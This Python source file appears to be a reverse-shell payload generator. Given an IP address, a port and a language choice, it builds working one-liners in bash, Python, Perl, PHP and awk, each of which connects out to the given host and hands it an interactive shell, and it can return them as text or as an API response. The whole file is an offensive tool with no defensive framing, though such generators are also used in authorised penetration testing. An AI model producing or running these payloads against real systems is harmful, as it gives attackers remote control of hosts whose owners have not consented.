import ipaddress

# Validate IP Addr.
def valid_ip(address):
    try: 
        print(ipaddress.ip_address(address))
        return True
    except:
        return False

# Validate Port.
def valid_port(port):
	if isinstance(port, int) and port <= 65535:
		return True

# Generate payloads.
def payload_generator(ip, port, lang, quotes_pref, shell_pref, api):

	if shell_pref == "bash":
		shell = "/bin/bash"
	elif shell_pref == "sh":
		shell = "/bin/sh"
	elif shell_pref == "csh":
		shell = "/bin/csh"
	elif shell_pref == "ksh":
		shell = "/bin/ksh"
	elif shell_pref == "zsh":
		shell = "/bin/zsh"
	else:
		shell = "/bin/bash"

	if lang == "bash":
		payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
	elif lang == "python":
		payload = f"socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"{shell}\")"
	elif lang == "perl":
		ppp1 = f"use Socket;$i=\"{ip}\";$p={port}"
		ppp2 = ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
		ppp3 = f'exec("{shell}")'
		ppp4 = ';};'
		payload = ppp1 + ppp2 + ppp3 + ppp4
	elif lang == "php":
		payload = f'$sock=fsockopen("{ip}",{port});exec("{shell} -i <&3 >&3 2>&3");'
	elif lang == "awk":
		app1 = 'BEGIN {s ='
		app2 = f'"/inet/tcp/0/{ip}/{port}";' 
		app3 = 'while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'
		payload = app1 + app2 + app3
	else:
		payload = ""

	if api:
		return { 'payload' : payload }
	if quotes_pref == "y":
		return f"'{payload}'\n"
	return f"{payload}\n"
